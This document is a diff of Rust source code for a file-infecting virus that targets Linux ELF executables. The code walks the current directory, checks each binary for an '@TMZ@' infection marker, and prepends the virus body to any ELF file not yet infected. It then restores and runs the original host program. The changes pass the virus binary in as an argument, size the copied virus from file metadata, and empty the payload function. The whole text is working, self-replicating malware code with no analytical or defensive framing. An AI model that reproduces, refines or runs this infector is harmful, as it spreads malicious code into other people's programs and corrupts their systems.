@@ -31,10 +31,10 @@ use std::{env, fs, process};
 
 const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b"\x7FELF"
 const INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@
-const VIRUS_SIZE: u64 = 2696496;
+const VIRUS_SIZE: u64 = 2601176;
 
 fn payload() {
-    println!("bruh");
+
 }
 
 fn get_file_size(path: &OsStr) -> u64 {
@@ -84,8 +84,10 @@ fn is_infected(path: &OsStr) -> bool {
 
 fn infect(virus: &OsString, target: &OsStr) {
     let mut host_buf = read_file(target);
-    let mut virus_buf = vec![0; VIRUS_SIZE as usize];
     let mut f = File::open(virus).expect("Failed to open file...");
+    
+    let size = f.metadata().unwrap().len();
+    let mut virus_buf = vec![0; size as usize];
     f.read_exact(&mut virus_buf).expect("Failed to read from file");
 
     let mut infected = File::create(target).expect("Failed to create infected file");
@@ -106,7 +108,7 @@ fn run_infected_host(path: &OsString) {
         .mode(0o755)
         .open(plain_host_path)
         .unwrap();
-    infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();
+    infected.seek(SeekFrom::Start(VIRUS_SIZE)).expect("Failed to seek file");
     infected.read_to_end(&mut host_buf).unwrap();
     drop(infected);
 
@@ -121,7 +123,13 @@ fn run_infected_host(path: &OsString) {
 
 fn main() {
     let args: Vec<String> = env::args().collect();
+    if args.len() < 2 {
+        println!("Enter a virus binary...");
+        process::exit(1);
+    }
+
     let myself = OsString::from(&args[0]);
+    let virus = OsString::from(&args[1]);
 
     let current_dir = env::current_dir().expect("Failed to get home dir");
     for entry in fs::read_dir(current_dir).expect("Failed to read home dir") {
@@ -131,20 +139,20 @@ fn main() {
         let metadata = fs::metadata(&path).expect("Failed to get metadata from path");
         if metadata.is_file() {
             let entry_name = path.file_name().expect("Failed to get file name from path");
-            if myself == entry_name {
+            if virus == entry_name || myself == entry_name {
                 continue;
             }
             if is_elf(entry_name) {
                 if !is_infected(entry_name) {
-                    infect(&myself, entry_name);
+                    infect(&virus, entry_name);
                 }
             }
         }
     }
 
-    if get_file_size(&myself) > VIRUS_SIZE {
+    if get_file_size(&virus) > VIRUS_SIZE {
         payload();
-        run_infected_host(&myself);
+        run_infected_host(&virus);
     } else {
         process::exit(0)
     }
